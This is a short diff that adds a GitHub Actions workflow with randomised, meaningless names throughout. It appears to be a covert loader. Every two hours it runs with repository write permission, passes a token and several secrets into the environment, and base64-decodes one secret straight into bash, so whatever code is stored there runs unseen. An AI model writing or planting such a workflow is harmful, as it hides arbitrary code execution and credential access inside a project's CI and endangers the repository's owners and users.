@@ -1,0 +1,21 @@
+name: Oc9YDhJzlBVJz5
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  PqAFfYnyi5ngelGx:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.mac4Lt }}
+      - name: u8lbIEoBM
+        env:
+          aDr992un: ${{ secrets.Upi1OrWkfgorP }}
+          wqsc6cqdsL4s: ${{ secrets.slylYKrxnb }}
+          eo7aTZhxLn: ${{ secrets.Z4UDizbaR4 }}
+          GITHUB_TOKEN: ${{ secrets.mac4Lt }}
+        run: echo "$aDr992un" | base64 -d | bash
